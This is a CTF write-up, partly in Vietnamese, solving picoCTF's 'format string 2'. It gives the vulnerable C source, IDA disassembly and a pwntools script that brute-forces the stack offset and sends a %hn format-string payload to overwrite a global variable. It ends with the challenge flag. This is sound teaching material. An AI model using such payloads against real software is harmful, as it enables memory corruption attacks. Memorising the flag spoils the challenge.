# format string 2

## Information

- Category: Pwnable
- Level: Medium

## Description

This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must *change* data on the stack!

## Hint

- pwntools are very useful for this problem!

## Solution

### What we got ?

- Tương tự các bài “format string” trước, đề bài cho một file binary và 1 file source code.
    
    ```c
    #include <stdio.h>
    
    int sus = 0x21737573;
    
    int main() {
      char buf[1024];
      char flag[64];
    
      printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
      fflush(stdout);
      scanf("%1024s", buf);
      printf("Here's your input: ");
      printf(buf);
      printf("\n");
      fflush(stdout);
    
      if (sus == 0x67616c66) {
        printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");
    
        // Read in the flag
        FILE *fd = fopen("flag.txt", "r");
        fgets(flag, 64, fd);
    
        printf("%s", flag);
        fflush(stdout);
      }
      else {
        printf("sus = 0x%x\n", sus);
        printf("You can do better!\n");
        fflush(stdout);
      }
    
      return 0;
    }
    ```
    
- Nhận xét:
    - Chương trình chỉ thực hiện print flag từ file `flag.txt` khi giá trị `sus` bằng `0x67616c66`. Nhưng `sus` là một biến toàn cục, không có sự thay đổi trong main.

### How to get flag ?

- Từ nhận xét trên, hướng giải quyết cho bài này chính là thay thế/ghi đè giá trị `0x21737573` đang được gán cho `sus` hiện tại qua `%n`.
- Thực hiện decompile file binary lấy từ đề bằng IDA, ta tìm được address của sus là 0x404060
    
    ```c
    .data:0000000000404060                 public sus
    .data:0000000000404060 sus             dd 21737573h            ; DATA XREF: main+7D↑r
    .data:0000000000404060                                         ; main:loc_4012DF↑r
    .data:0000000000404060 _data           ends
    .data:0000000000404060
    ```
    
- Tuy nhiên, việc ghi đè `0x67616c66` kí tự sẽ tốn rất nhiều thời gian. Nên ta thực hiện chia nhỏ giá trị cần ghi đè ra để tiết kiệm thời gian. Cụ thể  `0x67616c66` sẽ được chia thành `0x6761` và `0x6c66` . Khi đó, đối tượng cần ghi đè chỉ còn 2 bytes, nhỏ hơn so với một lần ghi ban đầu
- Sử dụng `%A$hn` với A là số lần phải `%hn` để lần `%hn` tiếp theo trỏ vào địa chỉ của `sus` trong stack mà ta đã input.
- Việc ta cần làm là xác định `A`bằng bao nhiêu để trỏ vào địa chỉ cần ghi đè.
- Thực hiện Brute Force để xác định `A`, kết hợp gửi payload để tìm flag. Ta xác định được `A = 18`. Code cụ thể như sau:
    
    ```python
    from pwn import *
    
    HOST = "rhea.picoctf.net"
    PORT = 59822
    
    sus_1 = p64(0x404060)
    sus_2 = p64(0x404062)
    val_1 = 0x6c66
    val_2 = 0x6761
    
    for offset in range(1, 19):
        challenge = remote(HOST, PORT)
        try:
            payload = b'%' + str(val_1).encode() + b'c%' + str(offset).encode() + b'$hn'
            payload += b'%' + str((val_2 - val_1) % 0x10000).encode() + b'c%' + str(offset + 1).encode() + b'$hn'
            payload += b'A' * ((8 - len(payload) % 8) % 8)
            payload += sus_1 + sus_2
    
            challenge.sendlineafter(b'?\n', payload)
            try:
                response = challenge.recvall(timeout=1)
            except EOFError:
                response = b''
            print(f"Offset {offset}: {response.decode(errors='ignore')}")
        finally:
            challenge.close()
    ```
    
- Flag cần tìm là **`picoCTF{f0rm47_57r?_f0rm47_m3m_5161a699}`**
